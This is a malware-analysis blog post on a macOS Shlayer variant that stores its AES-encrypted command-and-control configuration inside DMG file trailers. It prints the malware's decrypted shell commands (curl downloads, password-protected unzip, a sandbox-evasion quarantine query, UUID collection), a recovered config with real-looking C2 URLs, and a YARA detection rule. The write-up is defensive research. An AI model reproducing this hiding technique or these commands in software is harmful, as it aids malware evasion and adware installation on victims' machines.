---
title: "L’art de l’évasion: How Shlayer hides its configuration inside Apple proprietary DMG files"
date: 2022-12-24
categories: [malware-analysis, reverse-engineering]
tags: [macos, malware, reverse-engineering, web3, python, javascript, shlayer, bundlore]
description: "Intro"
toc: true
---

*Intro*

![image generated using OpenAI DALL·E models](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-01.png)
_image generated using OpenAI DALL·E models_


### Intro

While conducting routine threat hunting for macOS malware on Ad networks, I stumbled upon an unusual Shlayer sample. Upon further analysis, it became clear that this variant was different from the known Shlayer variants such as **OSX/Shlayer.D**, **OSX/Shlayer.E**, or **ZShlayer**. We have dubbed it **OSX/Shlayer.F.**

I then started tracking this **OSX/Shlayer.F** variant and checked to see if other vendors had encountered or written about it. It turns out that this variant had been reported on in previous blog posts:

- 26th April 2021 by Jamf, [here](https://www.jamf.com/blog/shlayer-malware-abusing-gatekeeper-bypass-on-macos/)
- 19th July 2021 by CrowdStrike, [her](https://www.crowdstrike.com/blog/shlayer-malvertising-campaigns-still-using-flash-update-disguise/)e

I wanted to revisit the **OSX/Shlayer.F** variant of the Shlayer malware to report on a technique that has not previously been seen in other macOS malware for hiding Command and Control (C2) information. This variant encrypts its configuration using **AES** within the DMG file header structure, resulting in a modified DMG file. The modification is cleverly crafted and does not cause the DMG file to become corrupted or malfunction. In fact, the macOS operating system is able to mount these modified DMG files and load them as usual.

Modified DMG files have been used by malware in the past, such as in the CIA’s [Imperial](https://wikileaks.org/vault7/#Imperial) project, which included a tool called Achilles that allowed operators to trojanize OS X disk image installers (DMG files) with a specified executable for one-time execution. This recent finding of the Shlayer malware hiding its configuration within DMG files brings to mind the potential for mac malware authors to use this technique more aggressively in the future, potentially for hiding essential components of their malware.


#### Some Shlayer thoughts before we dive in

Shlayer is a very primitive piece of malware, but had different modifications including this [variant](https://securelist.com/shlayer-for-macos/95724/) **Trojan-Downloader.OSX.Shlayer.e** reported by Kaspersky back in Jan 2020 as it is written in Python instead of bash.

Most of Shlayer has a bash script form like this variant **OSX/Shlayer.D** that I reported on back in 2019 [here](https://blog.confiant.com/osx-shlayer-new-shurprise-unveiling-osx-tarmac-f965a32de887) and SentionelOne [reported](https://www.sentinelone.com/blog/coming-out-of-your-shell-from-shlayer-to-zshlayer/) about **ZShlayer** in Septembre 2020, which is a variation of OSX/Shlayer.D that uses ZSH. There was also mach-O variant of Shlayer reported by UPTYCS [here](https://www.uptycs.com/blog/macos-bashed-apples-of-shlayer-and-bundlore) in July 2021, but no name was given to this variant specifically.

Shlayer has mainly been used as an installer/downloader, its main goal being to download adware like [Bundlore](https://www.uptycs.com/blog/macos-bashed-apples-of-shlayer-and-bundlore) (even though Bundlore can have its own installer as we reported [here](https://twitter.com/ConfiantIntel/status/1451641996800454660?s=20&t=K_UFB7t5SdtV9rIVzgV6gg)). But it can also download other Adware like the Cimpli installer as reported by Karspersky [here](https://securelist.com/shlayer-for-macos/95724/), etc.

Let’s dive into DMG files and see how Shlayer was able to modify them.


#### So what is an Apple DMG file?

Jonathan Levin described the format very well [here](http://newosxbook.com/DMG.html) and I invite the readers to go read his post for a much complete DMG format description.

If you are a macOS user you have probably already encountered DMG files when you download software. For non-mac Users, a DMG file is a mountable [disk image](https://techterms.com/definition/diskimage) primarily used to distribute software to the macOS operating system. Mac users typically download the file from the Internet and then double-click it to install an application on their computer:


![source:https://fileinfo.com/extension/dmg](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-02.png)
_source:https://fileinfo.com/extension/dmg_

In a nutshell a DMG file format is often represented like this :


![Author: Jonathan Levin source:http://newosxbook.com/DMG.html](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-03.png)
_Author: Jonathan Levin source:http://newosxbook.com/DMG.html_

- compressed image blocks (compression algorithm can vary)
- followed by a XML property list (plist) : This property list contains the DMG block map table. it is technically the resource fork of the DMG.
- followed by a 512-byte trailer at the end of the file. This trailer is identifiable by a magic 32-bit value, 0x6B6F6C79, which is “koly”. we will call it the “koly” block in this blog post.

Let’s pick a regular DMG file (not trojanized), let’s randomly check OSX/ZuRu that was fully analyzed by macOS security expert Patrick Wardle [here](https://objective-see.org/blog/blog_0x66.html). This malware was delivered via a [trojanized](https://zhuanlan.zhihu.com/p/408746101) Iterm2 app, but let’s focus on the DMG file:

[e5126f74d430ff075d6f7edcae0c95b81a5e389bf47e4c742618a042f378a3fa](https://www.virustotal.com/gui/file/e5126f74d430ff075d6f7edcae0c95b81a5e389bf47e4c742618a042f378a3fa)

We can see a typical and non modified DMG file:


![trailing koly block in an unmodified dmg file](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-04.png)
_trailing koly block in an unmodified dmg file_

We can say that the DMG file of this malware, is safe and not modified and everything looks normal.

Now let’s pick a modified DMG of a Shlayer malware and check the differences, and we can notice a blob of encrypted data was inserted between the plist file and the koli block (I blurred the blob hex bytes because as we will see later, the Shlayer config could contain identifiable victim information)


![image](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-05.png)


![encrypted Shlayer data inserted between Koly Block and the Plist file](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-06.png)
_encrypted Shlayer data inserted between Koly Block and the Plist file_

This will lead us to the next step, which is to reverse engineer this Shlayer variant, and find how we can decrypt this blob and probably write a standalone tool to automatically decrypt it.


#### Reversing OSX/Shlayer.F

We are going to run an analysis on the mach-O sample [**0fe475cc5da11e1f3ca5e0bc81d5ee406bdf4b4c428ebdab35f4dad63c0b9093**](https://www.virustotal.com/gui/file/0fe475cc5da11e1f3ca5e0bc81d5ee406bdf4b4c428ebdab35f4dad63c0b9093) that resulted from one of the modified DMG files.

The sample above is flagged by Confiant as **OSX/Shlayer.F, **and below is a YARA rule to detect this variant:


```swift
// by Confiant
private rule Macho
{
    meta:
        description = "private rule to match Mach-O binaries"
    condition:
        uint32(0) == 0xfeedface or uint32(0) == 0xcefaedfe or uint32(0) == 0xfeedfacf or uint32(0) == 0xcffaedfe or uint32(0) == 0xcafebabe or uint32(0) == 0xbebafeca
}
rule OSX/Shlayer.F
{
    meta:
        author = "taha@confiant.com"
        description = "variant F of shlayer using AES encrypted configuration embedded in the dmg"
    strings:
        $dmg_tag = "</plist>" ascii
        $s3 = ".s3" ascii
        $shlayer_conf1 = "lu"
        $shlayer_conf2 = "bdu"
        $shlayer_conf3 = "upb"
        $shlayer_conf4 = "du"
        $cccrypt = "_CCCrypt" ascii
    condition:
        Macho and $dmg_tag and $cccrypt and $s3 and any of ($shlayer_conf*)
}
```

String decryption as we saw in many of our [previous](https://blog.confiant.com/osx-hydromac-a-new-macos-malware-leaked-from-a-flashcards-app-2af28f1caa9e) blog posts is often enough to determine what the sample does in almost (if not all) MacOS Adware.

We have automated this string decryption process at scale for specific malware families including now **OSX/Shlayer.F**, and below is the output for this specific sample:


```markdown
encrypted string ref in function 0x1000073b0 decoded to : /tmp/
 encrypted string ref in function 0x100007b60 decoded to : %s/Contents/MacOS
 encrypted string ref in function 0x100008140 decoded to : %s %s > /dev/null 2>&1
 encrypted string ref in function 0x1000094b0 decoded to : echo '%s' | tr -d '' | openssl base64 -A -e 2>/dev/null | xargs | tr -d ''
 encrypted string ref in function 0x10000a0f0 decoded to : rm -rf %s > /dev/null 2>&1
 encrypted string ref in function 0x10000a1d0 decoded to : (cd %s; ls | head -n 1)
 encrypted string ref in function 0x10000a2d0 decoded to : for FILE in %s/*.app; do echo "${FILE}"; break; done; encrypted string ref in function 0x10000a3b0 decoded to : unzip -P %s %s -d %s > /dev/null 2>&1 encrypted string ref in function 0x10000c7a0 decoded to : curl -f0L -o %s '%s' > /dev/null 2>&1 encrypted string ref in function 0x10000e160 decoded to : curl -L '%s' > /dev/null 2>&1 encrypted string ref in function 0x10001a690 decoded to : curl -L '%s' 2>/dev/null encrypted string ref in function 0x10001b340 decoded to : sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent where LSQuarantineDataURLString like "%s3.amazonaws.com%" order by LSQuarantineTimeStamp desc limit 5'
 encrypted string ref in function 0x10001ff50 decoded to : hdiutil info -plist | perl -0777pe 's|<data>\s*(.*?)\s*</data>|<string>$1</string>|gs' | plutil -convert json -r -o - -- - encrypted string ref in function 0x100020110 decoded to : Install.command encrypted string ref in function 0x1000201d0 decoded to : %s encrypted string ref in function 0x100020260 decoded to : /Volumes/Install encrypted string ref in function 0x100020320 decoded to : %s %i encrypted string ref in function 0x100020840 decoded to : for FILE in %s/.hidden/*.command; do echo "${FILE}"; break; done;
 encrypted string ref in function 0x100020970 decoded to : system_profiler SPHardwareDataType | awk '/UUID/ { print $3; }' encrypted string ref in function 0x100020a50 decoded to : defaults read /System/Library/CoreServices/SystemVersion.plist ProductVersion
```

> Note the decrypted string that corresponds to commands, **OSX/Shlayer.F **executes them via [popen](https://opensource.apple.com/source/Libc/Libc-167/gen.subproj/popen.c.auto.html)() function.

Meanwhile, after reviewing the techniques I noticed the following :

- Commands were introduced in this **OSX/Shlayer.F **variant consisting of querying QuarantineEventsV2 database; A variation of this technique was already seen in other malware like OSX/Bundlore as reported by UPTYCS [here](https://www.uptycs.com/blog/macos-bundlore-are-attackers-testing-new-code), but so far not in Shlayer. And mapping mounted volumes parsing out specific information.
- I couldn’t find a C2 configuration in the decrypted strings, so we will have to find where this config was stored (see below)

As mentioned above, this variant **OSX/Shlayer.F **queries [QuarantineEventsV2](https://nixhacker.com/security-protection-in-macos-1/) as follows:


```javascript
sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV* 'select LSQuarantineDataURLString from LSQuarantineEvent where LSQuarantineDataURLString like "%s3.amazonaws.com%" order by LSQuarantineTimeStamp desc limit 5'
```

The query consists of determining if the .DMG file was downloaded from an Amazon S3 bucket. This is inline with what we reported in a previous [blog post](https://medium.com/confiant-blog/how-file-hashes-fail-as-a-malware-detection-heuristic-2e1fb310e8cd), regarding Shlayer campaigns abusing Amazon S3 buckets.

I could also see this used as an anti-sandbox check, since sandbox analysis systems won’t have such entry in the **LSQuarantineEvent** table when submitting a sample for analysis.

Now back to the turning point, which is extracting the C2 configuration for this variant **OSX/Shlayer.F. **So how does the extraction works?

For that, we have a first hint in the following command that is executed by **OSX/Shlayer.F **variant**:**


```xml
hdiutil info -plist | perl -0777pe 's|<data>\\s*(.*?)\\s*</data>|<string>$1</string>|gs' | plutil -convert json -r -o - -- -
```

When run, this command will list mounted images, and **OSX/Shlayer.F** will read the** image-path** value to get the path on disk to the parent DMG file mounted:


![Shlayer.F locating the parent dmg file](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-07.png)
_Shlayer.F locating the parent dmg file_

Then the parent DMG is opened and read block by block, the **</plist> **tag is used to locate the encrypted data that sits between this tag and the koli block.

After reversing **OSX/Shlayer.F** and locating the config decrypting code [**_CCCrypt**](https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man3/CCCrypt.3cc.html) is used with [**kCCAlgorithmAES128**](https://opensource.apple.com/source/CommonCrypto/CommonCrypto-36064/CommonCrypto/CommonCryptor.h)** **algorithm to decrypt this data, right after extracting the **AES key** and **IV**.


![OSX/Shlayer.FC2 config blob decryption routine](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-08.png)
_OSX/Shlayer.FC2 config blob decryption routine_

The **AES key** and **IV** are extracted and are present at the beginning of the encrypted blob following this format:

- The first 0x20 bytes corresponds to an AES key.
- Followed by 0x10 bytes corresponding to the IV.
- Followed by the c2 config encrypted data.

I wrote a standalone command line script to do the above:


[View Gist on GitHub](https://gist.github.com/tahaconfiant/d6d8746e56cbf0458358ed304a5118ac)

Below is an example of an extracted config from the DMG file below, using the script above: [**b7c84e6fe4315ca59269c09ffb9519f105363900317fed08e82c3827f208b0dd**](https://www.virustotal.com/gui/file/b7c84e6fe4315ca59269c09ffb9519f105363900317fed08e82c3827f208b0dd):


```perl
{
  "du": "https://s3.amazonaws.com/b30fd539-402f-4/2b88cb8a-6f2c-44/9945647b-15bd-4a/Install.dmg?fn=final-cut-pro-x-10-6-1-crack-license-key-latest-jan-2022&subaff=2874&e=5&k=7288ee87-db3e-4c47-9dc0-00f009e583a0&s=614aa849-d491-4ad4-a7fe-3ff69cb6f316&client=safari",
  "lu": "http://d2hznnx43bsrxg.cloudfront.net/slg?s=%s&c=%i&gs=1",
  "bdu": "http://d2hznnx43bsrxg.cloudfront.net/sd/?c=xGlybQ==&u=%s&s=%s&o=%s&b=15425161967&gs=1",
  "upb": "76916152451219215425161967",
  "p": "nDS8MxD+Tkb54Ocij+4ZMid1lT4f16QCAf/SsI8i+eT0HFx7udZJJTVL/7YETnYwBboycKYxn/WcRdly3ZNwI3lmhMgWobbf7vzy3nUKFhA/PG7wE/TnI7zwmTLlUCMn8ZlR2IhYTgk12+tVwcGfxRP6pjri4Un9Y6b/Pt8/0MGFWY5mSfY7+cRLhnyqLj3EmNoGcuVlV21s6bYZkgmKOAIjbWyQzLLVaw5LBxZK9x4elDe1OKcWdDzNp6Ar+42KYuZPnGlUVa7jUd+5diFSR73wxDIX2TdL+zfcsB4ampVkEUH07Wq8lvlFRKw6SmsJ96ptBR02JD5IgxxhXMaZfHc40E1ZOmxLHltCwpM1yx3aWQA8HUOQedjJnym92q1FDHFixfEgznTOxDZqAjULXPycYXsTkqRxrDqAWhPoSPi5fg3XywrhiytODCbsqbOk9KuryY/FlIdxD97p3V7jIpCi+6fCNegPj08uMmNt7BgrZDGwPoElyiaDEUlbvCc8wIB78QHi9f4GyRUkMmxeuWCLpTl63h+ynkNtPc4PbXe13x0z25s7nZWkPPouEfb8FlxF2LbG1HCXT9nzI9Dt/FHAgANbrAaXUEKmCjBlZnZLahkH2Tua6QaQ7GhV2CnayZctKAEdXMLVAUbpRRKK6lbmjvFGJigfarrNzAg8i3OONoKWA+nlnDE2kJ4Im9JaIjOo9KukCwjxt0fpV7JnvNCMg1IUQj34a41V261i2PvIGDBBIpRlFdKaWw9BFoK5uvG/V3PzHxU6l2E3seuPYFFeQPnHKk4W4ZF6NRRmQLThRVz3RxCKGWM9eMVJNDgbTb7fhFrMBgWLspSo9c7w3Uw1N0GGKMN4U5BFQx64TcXCttAPh8i9T5PQUsLm+mvJpxlWZWKtR0C+uLlQfAqAADGxfqrFlV6ZiEOXjMqdCB4tdvDEWbuEXBr6+yCut+9wNlu3/torf2UcPFR3iMM=",
  "umu": false
}
```

If you don’t like command line scripts, my colleague [Eliya Stein](https://medium.com/u/2c3f3d52c6be) wrote a CyberChef [recipe](https://gchq.github.io/CyberChef/#recipe=Comment%28%27Extract%20and%20decrypt%20the%20config%20from%20Shlayer%20DMGs.%5Cn%5CnBy%20Eliya%20Stein%20of%20Confiant%27%29To_Hex%28%27None%27,0%29Register%28%273c2f706c6973743e%28%5Ba-z0-9%5D%5Ba-z0-9%5D%29%28%28%5Ba-z0-9%5D%5Ba-z0-9%5D%29%7B32%7D%29%28%28%5Ba-z0-9%5D%5Ba-z0-9%5D%29%7B16%7D%29%28.*?%296b6f6c79%27,false,false,false%29Find_/_Replace%28%7B%27option%27:%27Regex%27,%27string%27:%27.*3c2f706c6973743e%28%5Ba-z0-9%5D%5Ba-z0-9%5D%29%28%28%5Ba-z0-9%5D%5Ba-z0-9%5D%29%7B48%7D%29%27%7D,%27%27,true,false,true,false%29Find_/_Replace%28%7B%27option%27:%27Regex%27,%27string%27:%276b6f6c79.*%27%7D,%27%27,true,false,true,false%29AES_Decrypt%28%7B%27option%27:%27Hex%27,%27string%27:%27$R1%27%7D,%7B%27option%27:%27Hex%27,%27string%27:%27$R3%27%7D,%27CBC%27,%27Hex%27,%27Raw%27,%7B%27option%27:%27Hex%27,%27string%27:%27%27%7D,%7B%27option%27:%27Hex%27,%27string%27:%27%27%7D%29) that can be used to decrypt **OSX/Shlayer.F **configs just by dragging and dropping DMG files, try it out!


### Conclusion

After analyzing a public corpus of **OSX/Shlayer.F **present in online repositories, we found that in the config, the field **du** (corresponding to the final recorded download url and its specific parameters) sometimes a parameter **client_ip **was present with the victim IP address. This allowed us to draw a map of previous **OSX/Shlayer.F **infections during Q1-Q3 2022:


![image](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-09.png)


![OSX/Shlayer.Fvictims & geography Q1-Q3 2022 — source Confiant](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-10.png)
_OSX/Shlayer.Fvictims & geography Q1-Q3 2022 — source Confiant_

and allowed us to determine the infection % between home networks and enterprise networks during Q1-Q3 2022:


![OSX/Shlayer.Finfections per type of network Q1-Q3 2022 — source Confiant](/assets/images/posts/l-art-de-l-vasion-how-shlayer-hides-its-configuration-inside/img-11.png)
_OSX/Shlayer.Finfections per type of network Q1-Q3 2022 — source Confiant_

Since its discovery in 2018, Shlayer has continued to pose a threat to the macOS platform. Over the years, we have seen various but limited modifications of Shlayer, with **OSX/Shlayer.F** representing a significant overhaul. It is likely that we will see further sophistication and ingenuity from the authors of this malware in the future.

This research highlights the importance of looking for modified or trojanized DMG files in larger sets of malware. I hope that it will inspire other researchers to take a deeper look at this issue, and I look forward to seeing the results of their findings.

*if you like this post, make sure to follow me on twitter at *[*Lordx64*](https://twitter.com/lordx64)* and *[*ConfiantIntel*](https://twitter.com/confiantintel)* for our latest threat intelligence findings.*
